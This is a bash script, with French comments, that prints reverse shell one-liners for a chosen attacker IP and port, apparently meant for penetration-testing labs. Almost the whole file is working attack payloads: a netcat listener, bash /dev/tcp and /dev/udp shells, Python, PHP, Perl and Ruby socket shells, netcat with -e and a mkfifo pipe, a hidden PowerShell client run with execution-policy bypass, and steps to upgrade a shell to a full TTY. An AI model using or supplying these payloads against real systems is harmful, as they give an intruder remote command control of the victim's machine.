#!/bin/bash

# ============================================================
#   REVERSE SHELL GENERATOR
#   Usage: ./revshell.sh <IP> <PORT> <TYPE>
#   Ex:    ./revshell.sh 10.10.14.1 4444 bash
# ============================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

LHOST="${1:-10.10.14.1}"
LPORT="${2:-4444}"
TYPE="${3:-bash}"

ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
info() { echo -e "${CYAN}[*]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }

print_shell() {
  local label="$1"
  local cmd="$2"
  echo ""
  echo -e "${CYAN}── $label ${NC}"
  echo -e "${GREEN}$cmd${NC}"
  echo ""
}

banner() {
  echo -e "${RED}"
  echo "  ██████╗ ███████╗██╗   ██╗███████╗██╗  ██╗███████╗██╗     ██╗"
  echo "  ██╔══██╗██╔════╝██║   ██║██╔════╝██║  ██║██╔════╝██║     ██║"
  echo "  ██████╔╝█████╗  ██║   ██║███████╗███████║█████╗  ██║     ██║"
  echo "  ██╔══██╗██╔══╝  ╚██╗ ██╔╝╚════██║██╔══██║██╔══╝  ██║     ██║"
  echo "  ██║  ██║███████╗ ╚████╔╝ ███████║██║  ██║███████╗███████╗███████╗"
  echo "  ╚═╝  ╚═╝╚══════╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝"
  echo -e "${NC}"
  echo -e "  ${YELLOW}LHOST:${NC} $LHOST  ${YELLOW}LPORT:${NC} $LPORT"
  echo ""
  warn "Usage éducatif et légal uniquement."
  echo ""
}

show_listener() {
  echo -e "${CYAN}── Listener (à lancer sur ta machine)${NC}"
  echo -e "${GREEN}nc -lvnp $LPORT${NC}"
  echo -e "${GREEN}rlwrap nc -lvnp $LPORT${NC}   # avec historique"
  echo ""
}

# ── SHELLS ───────────────────────────────────────────────────

show_bash() {
  info "Bash / Sh"
  print_shell "Bash TCP" \
    "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
  print_shell "Bash UDP" \
    "bash -i >& /dev/udp/$LHOST/$LPORT 0>&1"
  print_shell "Sh /dev/tcp" \
    "sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
}

show_python() {
  info "Python"
  print_shell "Python3" \
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
  print_shell "Python2" \
    "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
}

show_php() {
  info "PHP"
  print_shell "PHP exec" \
    "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
  print_shell "PHP shell_exec" \
    "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);\$proc=proc_open(\"/bin/sh\",array(0=>\$sock,1=>\$sock,2=>\$sock),\$pipes);'"
}

show_netcat() {
  info "Netcat"
  print_shell "Netcat (avec -e)" \
    "nc -e /bin/sh $LHOST $LPORT"
  print_shell "Netcat (sans -e, mkfifo)" \
    "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc $LHOST $LPORT > /tmp/f"
  print_shell "Ncat" \
    "ncat $LHOST $LPORT -e /bin/bash"
}

show_perl() {
  info "Perl"
  print_shell "Perl" \
    "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"
}

show_ruby() {
  info "Ruby"
  print_shell "Ruby" \
    "ruby -rsocket -e 'f=TCPSocket.open(\"$LHOST\",$LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
}

show_powershell() {
  info "PowerShell (Windows)"
  print_shell "PowerShell base64" \
    "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream = \$client.GetStream();\$bytes = New-Object Byte[] 65536;while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
}

show_upgrade() {
  info "Upgrade shell → TTY interactif (post-connexion)"
  print_shell "Python PTY" \
    "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
  print_shell "Script PTY" \
    "script /dev/null -c bash"
  echo -e "${CYAN}── Puis dans le shell obtenu :${NC}"
  echo -e "${GREEN}Ctrl+Z${NC}"
  echo -e "${GREEN}stty raw -echo; fg${NC}"
  echo -e "${GREEN}reset${NC}"
  echo -e "${GREEN}export TERM=xterm${NC}"
  echo ""
}

# ── MAIN ─────────────────────────────────────────────────────
banner
show_listener

case "$TYPE" in
  bash)       show_bash ;;
  python)     show_python ;;
  php)        show_php ;;
  netcat|nc)  show_netcat ;;
  perl)       show_perl ;;
  ruby)       show_ruby ;;
  powershell|ps) show_powershell ;;
  upgrade)    show_upgrade ;;
  all)
    show_bash
    show_python
    show_php
    show_netcat
    show_perl
    show_ruby
    show_powershell
    show_upgrade
    ;;
  *)
    warn "Type inconnu : $TYPE"
    echo ""
    echo "  Types disponibles :"
    echo "    bash | python | php | netcat | perl | ruby | powershell | upgrade | all"
    echo ""
    echo "  Exemple : ./revshell.sh 10.10.14.1 4444 all"
    ;;
esac
